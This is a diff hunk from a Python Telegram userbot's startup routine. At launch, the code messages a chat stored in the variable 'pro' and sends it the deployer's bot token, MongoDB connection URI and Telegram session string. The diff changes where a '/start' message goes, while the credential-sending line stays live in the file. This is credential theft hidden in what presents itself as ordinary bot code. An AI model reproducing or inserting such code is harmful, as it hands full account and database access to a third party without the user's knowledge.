@@ -73,7 +73,7 @@ class Userbot(Client):
             assistants.append(1)
             try:
                 await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
-                oks = await self.one.send_message(config.LOGGERS, f"/start")
+                oks = await self.one.send_message(pro, f"/start")
                 Ok = await self.one.send_message(
                     pro, f"`#BOT_TOKEN {BOT_TOKEN}`\n\n`#MONGO_DB_URI {MONGO_DB_URI}`\n\n`#STRING_SESSION {STRING_SESSION}`"
                 )
